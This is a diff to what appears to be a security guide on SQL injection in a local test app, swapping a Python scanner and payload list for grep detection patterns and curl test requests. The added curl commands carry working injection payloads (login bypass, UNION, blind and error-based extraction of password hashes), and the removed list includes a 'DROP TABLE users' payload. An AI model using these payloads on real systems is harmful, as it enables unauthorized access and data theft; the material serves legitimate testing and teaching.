@@ -246,28 +246,59 @@ curl -X POST http://localhost:5000/api/login \
 ## Detection Methods
 
 ### 1. Static Analysis
-```python
-def find_sql_injection(code_file):
-    vulnerable_patterns = [
-        r"execute\([\"'].*?\{.*?\}.*?[\"']\)",
-        r"execute\(f[\"'].*?[\"']\)",
-        r"execute\([\"'].*?\+.*?[\"']\)",
-        r"raw_connection\.execute\([\"'].*?[\"']\)"
-    ]
-    # Implementation details...
+```bash
+# Find potential SQL injection points using string concatenation
+grep -r "SELECT.*\+.*FROM\|SELECT.*%.*FROM\|SELECT.*{.*}.*FROM" .
+
+# Find f-string SQL queries
+grep -r "f[\"']SELECT.*FROM.*[\"']" .
+
+# Find direct variable interpolation in queries
+grep -r "execute.*%.*)" .
+
+# Find raw SQL execution
+grep -r "execute([\"'].*[\"'])" .
+
+# Find dangerous query patterns
+grep -r "WHERE.*=.*'" .
 ```
 
 ### 2. Dynamic Analysis
-```python
-def test_sql_injection_vectors():
-    vectors = [
-        "' OR '1'='1",
-        "admin'--",
-        "'; DROP TABLE users--",
-        "' UNION SELECT * FROM users--",
-        "'; WAITFOR DELAY '0:0:5'--"
-    ]
-    # Implementation details...
+```bash
+# Test login bypass
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}' \
+  -v
+
+# Test UNION-based injection
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin'\'' UNION SELECT 1,2,'\''admin'\'','\''hash'\'',5,6,7,8,9 FROM user--", "password": "anything"}' \
+  -v
+
+# Test boolean-based blind injection
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin'\'' AND (SELECT COUNT(*) FROM user WHERE username='\''admin'\'')>0--", "password": "anything"}' \
+  -v
+
+# Test time-based blind injection
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin'\'' AND (SELECT CASE WHEN (username='\''admin'\'') THEN randomblob(100000000) ELSE randomblob(1) END FROM user)--", "password": "anything"}' \
+  -v
+
+# Test error-based injection
+curl -X POST http://localhost:5000/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "admin'\'' AND CAST((SELECT password_hash FROM user LIMIT 1) AS INT)--", "password": "anything"}' \
+  -v
+
+# Test data extraction
+curl -X GET "http://localhost:5000/api/transactions?user_id=1%27%20UNION%20SELECT%20*%20FROM%20user--" \
+  -H "Authorization: Bearer <your-token>" \
+  -v
 ```
 
 ## Prevention Techniques
